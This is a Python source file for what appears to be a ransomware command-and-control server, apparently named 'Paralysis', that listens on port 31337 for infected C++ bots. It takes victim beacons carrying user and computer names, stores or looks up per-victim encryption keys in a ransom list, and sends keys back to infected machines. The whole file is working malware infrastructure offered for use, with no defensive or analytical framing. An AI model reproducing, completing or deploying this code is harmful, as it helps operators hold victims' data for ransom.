import socket
import threading
import os
import os.path
import sys
import time
import select
import random
from datetime import datetime
from random import randint

all_connections = []
all_addresses = []

global type
global botAddr
global botHandling
global botID
global ShellbotID
botID = 0
global loggingIn
global handling
global addr
global user
global passwd
global tl
tl = 0
global lstn
global all
global cow
cow = 0
all = False

global st

black = open('ransomList.txt', 'a')
black.close()

logFile = open('LogParalysis.txt', 'a')
logFile.close()


#Create socket 1
def socket_create():
	try:
		logs = open('LogParalysis.txt', 'a')
		global host
		global port
		global s
		host = '' #LEAVE THIS BLANK#
##################################################
#THIS IS THE PORT WHERE THE CPP BOTS WILL CONNECT#
##################################################
		port = 31337 #THE PORT FOR THE BOTS TO CONNECT. DO NOT CHANGE # DO NOT CHANGE # DO NOT CHANGE #
		s = socket.socket()
		logs.write('[!] Created Socket\n')
		logs.close()
		print('[!] Created first socket')
	except socket.error as msg:
		print('[!]Could not create socket: ' + str(msg))

#Binding socket to port and wait for connection
def socket_bind():
	try:
		logs = open('LogParalysis.txt', 'a')
		global host
		global port
		global s
		global p
		s.bind((host, port))
		s.listen(5)
		logs.write('[!] Bound Socket\n')
		logs.close()
		print('[!] Bound first socket')
	except socket.error as msg:
		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
		sys.exit()


global admins
global clients
admins = 0
clients = 0

#When a bot comes to login
def botLogin(conn, addr, type):
	global botID
	global ShellbotID
	global botHandling
	global botAddr
	print('[!] CPP Bot login started')
	logFile = open('LogParalysis.txt', 'a')
	logFile.write('[!] CPP Bot login started\n')
	logFile.close()
	all_addresses.append(addr)
	all_connections.append(conn)
	print('[!] looks good')
	logFile = open('LogParalysis.txt', 'a')
	logFile.write('[!] looks good\n')
	logFile.close()
	print('[!] Starting CPP bot handler for ' + str(addr[0]))
	logFile = open('LogParalysis.txt', 'a')
	logFile.write('[!] Starting CPP bot handler for ' + str(addr[0]) + '\n')
	logFile.close()
	botID = botID + 1
	#HANDLE THE RANSOM#
	br = False
	black = open('ransomList.txt', 'a')
	black.close()
	with open('ransomList.txt') as b:
		blacklist = b.readlines()
	b.close()
	blacky = False
	print('[!] waiting for victim beacon')
	ID = str(conn.recv(1024).decode("ascii")).replace("\n", "").replace("\r", "")
	print('[!] got victim beacon')
	victimName, victimComputer = ID.split(':')
	print('[!] Parsed beacon')
	for inter in blacklist:
		try:
			IP, username, computername, key = str(inter).split(':')
			if (victimName == username) and (computername == victimComputer) and (IP == addr[0]):
				print('[!] Known victim connected: ' + str(addr))
				logFile = open('LogParalysis.txt', 'a')
				logFile.write('[!] Known victim connected: ' + str(addr) + '\n')
				logFile.close()
				print('[!] Key for ' + str(ID) + ': ' + key)
				logFile = open('LogParalysis.txt', 'a')
				logFile.write('[!] Key for ' + str(ID) + ': ' + key + '\n')
				logFile.close()
				conn.send(str.encode(key))
				blacky = True
			else:
				blacky = False
		except:
			blacky = False
			print('[!] something went wrong')
	if blacky == False:
		print('[!] New victim connected: ' + str(addr))
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[!] New victim connected: ' + str(addr) + '\n')
		logFile.close()
		print('[!] Determining random solution')
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[!] Determining random solution\n')
		logFile.close()
		conn.send(str.encode('NoKey'))
		newKey = str(conn.recv(1024).decode("ascii")).replace("\n", "").replace("\r", "")
		print('[!] Received new key for ' + str(ID) + ': ' + str(newKey))
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[!] Received new key for ' + str(ID) + ': ' + str(newKey) + '\n')
		logFile.close()
		black = open('ransomList.txt', 'a')
		black.write(str(addr[0]) + ':' + str(victimName) + ':' + str(victimComputer) + ':' + str(newKey) + '\n')
		black.close()
		print('[!] Updated random list: ' + str(addr[0]) + ':' + str(victimName) + ':' + str(victimComputer) + ':' + str(newKey))
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[!] Updated random list: ' + str(addr[0]) + ':' + str(victimName) + ':' + str(victimComputer) + ':' + str(newKey) + '\n')
		logFile.close()

def accept_connections():
	global botID
	global botAddr
	global botHandling
	global type
	print('[!] Waiting for CPP bot connections')
	logFile = open('LogParalysis.txt', 'a')
	logFile.write('[!] Waiting for CPP bot connections\n')
	logFile.close()
	global cow
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while 1:
		conn, address = s.accept()
		conn.setblocking(1)
		print('\n[+]CPP bot Connection established: ' + address[0])
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[+]CPP bot Connection established: ' + address[0] + '\n')
		logFile.close()
		botHandling = conn
		botAddr = address
		type = 'CPP'
		print('[!] Starting CPP bot login')
		logFile = open('LogParalysis.txt', 'a')
		logFile.write('[!] Starting CPP bot login\n')
		logFile.close()
		cow = cow + 1
		botLogin(botHandling, botAddr, type)
		time.sleep(0.5)
	
try:
	global threadCount
	global first
	first = True
	threadCount = 0
	socket_create()
	socket_bind()
	accept_connections()
	print('[!] Started all necessary processes')
	logFile = open('LogParalysis.txt', 'a')
	logFile.write('[!] Started all necessary processes\n')
	logFile.close()
	waiter()
except KeyboardInterrupt:
	lstn = False
	print('[!] Exiting')